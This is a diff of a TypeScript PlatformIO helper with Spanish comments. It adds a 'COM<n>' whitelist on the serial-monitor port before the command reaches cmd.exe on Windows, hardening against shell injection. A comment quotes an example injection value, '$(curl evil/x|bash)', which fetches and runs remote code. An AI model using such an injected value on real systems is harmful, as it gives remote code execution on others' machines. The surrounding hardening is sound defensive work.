@@ -317,9 +317,11 @@ function quoteIfNeeded(value: string): string {
  *     alfabeto real de esos nombres) y nada mas: ni `$`, ni backtick, ni `;`,
  *     ni espacio, ni comillas.
  *
- * USADA SOLO en la rama de macOS de `monitor` (mas abajo, adentro de
- * `execute()`), que es la UNICA que arma un shell string — ver el comentario
- * ahi de por que no hace falta en Windows ni en Linux.
+ * Se aplica en las dos ramas de `monitor` donde el puerto llega a un shell
+ * (mas abajo, adentro de `execute()`): macOS usa `puertoValido()` (AppleScript
+ * -> shell POSIX) y Windows usa sólo `PUERTO_WINDOWS` (`cmd /c start ... cmd
+ * /k`, y cmd.exe re-parsea su linea). Linux no valida: ahi el puerto va como
+ * argv a la terminal, sin shell intermedio.
  */
 const PUERTO_WINDOWS = /^COM\d+$/i
 const PUERTO_UNIX = /^\/dev\/(?:tty|cu)[A-Za-z0-9._-]+$/
@@ -1062,6 +1064,24 @@ Vas a ver los datos de la placa en ${puerto} a ${baud} baudios${origenBaud}. Par
         // El primer argumento entre comillas de `start` es el TITULO de la ventana, por eso va
         // siempre un titulo antes de la ruta de pio (que puede tener espacios, ej: "Maria Jose").
         if (process.platform === "win32") {
+          /*
+           * VALIDACION ANTES DE cmd.exe. Aunque el comando se arme como array
+           * para `Bun.spawn`, el que lo recibe es `cmd.exe`, que vuelve a leer
+           * su linea: `&`, `|`, `^`, `<`, `>` son operadores para el. `puerto`
+           * es texto libre (`args.port`), asi que sólo pasa la forma `COM<n>`
+           * (la misma que lee `detectPort()` y la que da la descripcion del
+           * tool); cualquier otra cosa se rechaza sin lanzar nada. Hardening
+           * preventivo: la inyeccion no se reprodujo, ver
+           * tests/platformio-execute.test.mjs ("monitor en Windows").
+           */
+          if (!PUERTO_WINDOWS.test(puerto)) {
+            return (
+              `No reconozco ese puerto: \`${puerto}\`.\n\n` +
+              "En Windows un puerto real tiene una forma como `COM3`. No lo voy a usar tal cual " +
+              "porque podria no ser un puerto — pedime `/diagnostico` para ver los puertos " +
+              "disponibles, o decime el puerto correcto."
+            )
+          }
           const titulo = `Monitor Serial - ${puerto}`
           const res = await run(
             ["cmd", "/c", "start", titulo, "cmd", "/k", pioPath, "device", "monitor", "--port", puerto, "--baud", String(baud)],
@@ -1074,7 +1094,7 @@ Vas a ver los datos de la placa en ${puerto} a ${baud} baudios${origenBaud}. Par
         // Mac: le pedimos a Terminal.app que corra el comando en una ventana nueva via AppleScript.
         if (process.platform === "darwin") {
           /*
-           * VALIDACION SOLO ACA, y es a proposito.
+           * VALIDACION ACA (y en la rama de Windows, de arriba).
            *
            * `puerto` es un string libre (`args.port`, sin restricciones en el
            * schema) que termina interpolado en un AppleScript que Terminal.app
@@ -1084,12 +1104,10 @@ Vas a ver los datos de la placa en ${puerto} a ${baud} baudios${origenBaud}. Par
            * Un puerto como `$(curl evil/x|bash)` ejecuta lo que sea en la Mac
            * del docente.
            *
-           * Windows (mas abajo) y Linux (mas abajo todavia) arman el comando
-           * con ARRAYS reales para `Bun.spawn`, sin shell intermedio: no hay
-           * injection que tapar ahi, y agregarles la misma whitelist solo
-           * arriesga rechazar un puerto real con una forma que no imaginamos,
-           * en las dos plataformas que hoy andan bien. Por eso el chequeo vive
-           * solo en la rama que lo necesita.
+           * Linux (mas abajo) arma el comando con un ARRAY real para la
+           * terminal, sin shell intermedio, y no valida. Windows tambien usa un
+           * array, pero lo recibe `cmd.exe`, que re-parsea la linea: por eso
+           * esa rama exige `COM<n>` antes de lanzar nada.
            */
           if (!puertoValido(puerto)) {
             return (
